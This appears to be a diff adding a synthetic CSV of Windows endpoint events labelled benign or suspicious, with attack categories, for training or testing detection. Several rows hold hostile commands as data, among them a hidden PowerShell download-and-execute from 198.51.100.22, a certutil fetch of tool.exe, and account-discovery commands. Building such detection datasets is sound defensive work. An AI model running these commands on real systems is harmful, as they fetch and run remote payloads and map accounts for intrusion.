@@ -1,0 +1,31 @@
+timestamp,hostname,username,source_ip,destination_ip,destination_port,process_name,parent_process,command_line,event_type,protocol,failed_logins,encoded_command,external_connection,privilege_escalation_flag,persistence_flag,severity_label,probable_attack_category
+2024-01-16 07:55:12,WORKSTATION-11,krobinson,192.168.1.20,192.168.1.1,443,chrome.exe,explorer.exe,chrome.exe --restore-last-session,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 08:03:47,WORKSTATION-05,cthomas,192.168.1.14,192.168.1.20,445,WINWORD.EXE,explorer.exe,WINWORD.EXE /n "C:\Temp\invoice.docx",file_access,TCP,0,False,False,False,False,benign,None
+2024-01-16 08:17:23,WORKSTATION-12,lmartinez,192.168.1.21,192.168.1.1,80,chrome.exe,explorer.exe,chrome.exe --type=renderer,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 08:31:09,WORKSTATION-03,alee,192.168.1.12,192.168.1.2,445,net.exe,cmd.exe,net use \\192.168.1.2\admin$,process_create,TCP,3,False,False,False,False,suspicious,Discovery
+2024-01-16 08:44:55,WORKSTATION-11,krobinson,192.168.1.20,192.168.1.1,443,OUTLOOK.EXE,explorer.exe,OUTLOOK.EXE /recycle,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 08:58:41,WORKSTATION-04,bwilson,192.168.1.13,192.168.1.2,445,powershell.exe,WINWORD.EXE,powershell.exe -ExecutionPolicy Bypass -File C:\Temp\update.ps1,process_create,TCP,0,False,False,False,False,suspicious,Execution
+2024-01-16 09:12:27,WORKSTATION-08,fgarcia,192.168.1.17,192.168.1.1,443,chrome.exe,explorer.exe,chrome.exe --renderer-process-limit=5,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 09:26:13,SERVER-DC01,unknown,192.168.1.2,192.168.1.2,445,svchost.exe,services.exe,svchost.exe -k netsvcs,network_connection,TCP,7,False,False,False,False,suspicious,Credential Access
+2024-01-16 09:39:59,WORKSTATION-13,mwhite,192.168.1.22,192.168.1.1,443,chrome.exe,explorer.exe,chrome.exe --type=utility,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 09:53:45,WORKSTATION-06,dmartin,192.168.1.15,192.168.1.2,445,cmd.exe,explorer.exe,cmd.exe /c whoami && ipconfig /all,process_create,TCP,0,False,False,False,False,suspicious,Discovery
+2024-01-16 10:07:31,WORKSTATION-05,cthomas,192.168.1.14,198.51.100.22,8080,powershell.exe,WINWORD.EXE,powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.22:8080/payload'),process_create,TCP,0,False,True,False,False,suspicious,Command and Control
+2024-01-16 10:21:17,WORKSTATION-14,nanderson,192.168.1.23,192.168.1.1,80,chrome.exe,explorer.exe,chrome.exe --remote-debugging-port=0,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 10:35:03,WORKSTATION-07,eharris,192.168.1.16,192.168.1.1,443,OUTLOOK.EXE,explorer.exe,OUTLOOK.EXE /recycle,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 10:48:49,WORKSTATION-02,mjones,192.168.1.11,192.168.1.2,445,cmd.exe,WINWORD.EXE,cmd.exe /c net localgroup administrators,process_create,TCP,0,False,False,False,False,suspicious,Discovery
+2024-01-16 11:02:35,WORKSTATION-15,osmith,192.168.1.24,192.168.1.1,443,chrome.exe,explorer.exe,chrome.exe --disable-extensions,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 11:16:21,WORKSTATION-09,gharrison,192.168.1.18,192.168.1.2,3389,mstsc.exe,explorer.exe,mstsc.exe /v:SERVER-DC01,network_connection,TCP,5,False,False,False,False,suspicious,Lateral Movement
+2024-01-16 11:30:07,WORKSTATION-04,bwilson,192.168.1.13,192.168.1.20,445,EXCEL.EXE,explorer.exe,EXCEL.EXE "C:\Users\bwilson\Downloads\macro_report.xlsm",file_access,TCP,0,False,False,False,False,benign,None
+2024-01-16 11:43:53,WORKSTATION-12,lmartinez,192.168.1.21,192.168.1.2,445,net.exe,cmd.exe,net user administrator /domain,process_create,TCP,0,False,False,False,False,suspicious,Discovery
+2024-01-16 11:57:39,WORKSTATION-16,ptaylor,192.168.1.25,192.168.1.1,443,chrome.exe,explorer.exe,chrome.exe --type=gpu-process,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 12:11:25,WORKSTATION-03,alee,192.168.1.12,192.168.1.50,445,cmd.exe,explorer.exe,cmd.exe /c copy C:\Users\alee\Desktop\*.* \\SERVER-FILE01\share\,process_create,TCP,0,False,False,False,False,suspicious,Exfiltration
+2024-01-16 12:25:11,WORKSTATION-06,dmartin,192.168.1.15,192.168.1.1,443,chrome.exe,explorer.exe,chrome.exe --restore-last-session,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 12:38:57,WORKSTATION-10,ilopez,192.168.1.19,192.168.1.2,389,powershell.exe,cmd.exe,powershell.exe Get-ADUser -Filter * -Properties *,process_create,TCP,0,False,False,False,False,suspicious,Discovery
+2024-01-16 12:52:43,WORKSTATION-17,qtaylor,192.168.1.26,192.168.1.1,80,chrome.exe,explorer.exe,chrome.exe --type=extension,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 13:06:29,SERVER-DC01,svc_backup,192.168.1.2,192.168.1.50,445,svchost.exe,services.exe,svchost.exe -k LocalServiceNetworkRestricted,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 13:20:15,WORKSTATION-05,cthomas,192.168.1.14,192.168.1.2,445,wscript.exe,WINWORD.EXE,wscript.exe C:\Temp\update.vbs,process_create,TCP,0,False,False,False,False,suspicious,Execution
+2024-01-16 13:34:01,WORKSTATION-18,rjohnson,192.168.1.27,192.168.1.1,443,chrome.exe,explorer.exe,chrome.exe --restore-last-session,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 13:47:47,WORKSTATION-11,krobinson,192.168.1.20,192.168.1.2,445,certutil.exe,cmd.exe,certutil.exe -urlcache -f http://192.168.1.99/tool.exe C:\Temp\tool.exe,process_create,TCP,0,False,False,True,False,suspicious,Execution
+2024-01-16 14:01:33,WORKSTATION-01,jsmith,192.168.1.10,192.168.1.20,445,WINWORD.EXE,explorer.exe,WINWORD.EXE /n "C:\Users\jsmith\Documents\report.docx",file_access,TCP,0,False,False,False,False,benign,None
+2024-01-16 14:15:19,WORKSTATION-08,fgarcia,192.168.1.17,192.168.1.1,80,chrome.exe,explorer.exe,chrome.exe --renderer-process-limit=5,network_connection,TCP,0,False,False,False,False,benign,None
+2024-01-16 14:29:05,WORKSTATION-13,mwhite,192.168.1.22,192.168.1.2,445,cmd.exe,WINWORD.EXE,cmd.exe /c systeminfo,process_create,TCP,0,False,False,False,False,suspicious,Discovery
